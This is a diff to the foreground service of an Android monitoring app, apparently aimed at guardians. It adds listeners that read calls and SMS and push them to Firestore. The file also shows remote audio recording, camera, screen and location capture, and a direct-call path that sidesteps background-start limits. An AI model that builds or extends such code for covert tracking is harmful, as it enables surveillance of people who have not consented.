@@ -3,7 +3,7 @@ package com.nexus.androkiller.service
 import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
-import android.app.NotificationManager
+import android.app.NotificationManager as AndroidNotificationManager
 import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
@@ -33,6 +33,7 @@ import com.nexus.androkiller.tracker.AudioRecorderManager
 import com.nexus.androkiller.tracker.CameraSnapshotManager
 import com.nexus.androkiller.tracker.DeviceStatusProvider
 import com.nexus.androkiller.tracker.LocationTracker
+import com.nexus.androkiller.tracker.NotificationManager as CustomNotificationManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -63,6 +64,7 @@ class TrackerForegroundService : Service() {
     private lateinit var torchManager: com.nexus.androkiller.tracker.TorchManager
     private lateinit var installedAppsManager: com.nexus.androkiller.tracker.InstalledAppsManager
     private lateinit var screenCaptureManager: com.nexus.androkiller.tracker.ScreenCaptureManager
+    private lateinit var notificationManager: CustomNotificationManager
     private lateinit var repository: TrackerRepository
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -83,6 +85,7 @@ class TrackerForegroundService : Service() {
         callSmsManager = com.nexus.androkiller.tracker.CallSmsManager(this)
         torchManager = com.nexus.androkiller.tracker.TorchManager(this)
         installedAppsManager = com.nexus.androkiller.tracker.InstalledAppsManager(this)
+        notificationManager = CustomNotificationManager(this)
         repository = TrackerRepository(this)
 
         acquireWakeLock()
@@ -166,7 +169,11 @@ class TrackerForegroundService : Service() {
         // 3. Listen for dashboard commands with auto-recovery
         ensureCommandListenerActive(deviceId)
 
-        // 4. Start heartbeat status updater & keepalive watchdog
+        // 4. Initialize SMS cursor and start real-time notification listeners (calls, SMS, guardian messages)
+        com.nexus.androkiller.tracker.NotificationManager.initializeSmsCursor(this)
+        notificationManager.startListening(deviceId)
+
+        // 5. Start heartbeat status updater & keepalive watchdog
         heartbeatJob?.cancel()
         heartbeatJob = serviceScope.launch {
             while (isActive) {
@@ -314,7 +321,7 @@ class TrackerForegroundService : Service() {
                                 android.Manifest.permission.CALL_PHONE
                             ) == android.content.pm.PackageManager.PERMISSION_GRANTED
 
-                            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as AndroidNotificationManager
 
                             if (directCall && hasCallPermission) {
                                 // 1. Attempt TelecomManager.placeCall (Direct IPC bypassing ActivityTaskManager background start restrictions)
@@ -673,7 +680,11 @@ class TrackerForegroundService : Service() {
     }
 
     private fun showHighPriorityParentMessageNotification(text: String) {
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+        // Push to Firestore for web UI
+        val deviceId = statusProvider.getDeviceId()
+        notificationManager.pushGuardianMessageNotification(deviceId, text)
+
+        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? AndroidNotificationManager
         val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
 
         val chatIntent = Intent(this, com.nexus.androkiller.ui.chat.ChatOverlayActivity::class.java).apply {
@@ -726,6 +737,9 @@ class TrackerForegroundService : Service() {
 
         releaseWakeLock()
         releaseWifiLock()
+
+        // Stop notification listeners
+        notificationManager.stopListening()
     }
 
     @Synchronized
@@ -803,19 +817,19 @@ class TrackerForegroundService : Service() {
     }
 
     private fun updateNotificationText(text: String) {
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? AndroidNotificationManager
         manager?.notify(NOTIFICATION_ID, buildServiceNotification(text))
     }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val manager = getSystemService(NotificationManager::class.java) ?: return
+            val manager = getSystemService(AndroidNotificationManager::class.java) ?: return
 
             // 1. High-priority pinned persistent notification channel
             val fgChannel = NotificationChannel(
                 CHANNEL_ID,
                 "Nexus Persistent Service",
-                NotificationManager.IMPORTANCE_HIGH
+                AndroidNotificationManager.IMPORTANCE_HIGH
             ).apply {
                 description = "Maintains persistent background telemetry and real-time remote commands bridge"
                 setShowBadge(false)
@@ -833,7 +847,7 @@ class TrackerForegroundService : Service() {
             val alertChannel = NotificationChannel(
                 CHANNEL_ID_ALERTS,
                 "Guardian Alerts & Calls",
-                NotificationManager.IMPORTANCE_HIGH
+                AndroidNotificationManager.IMPORTANCE_HIGH
             ).apply {
                 description = "Audible notifications for incoming Guardian alerts and calls"
                 setSound(soundUri, audioAttributes)
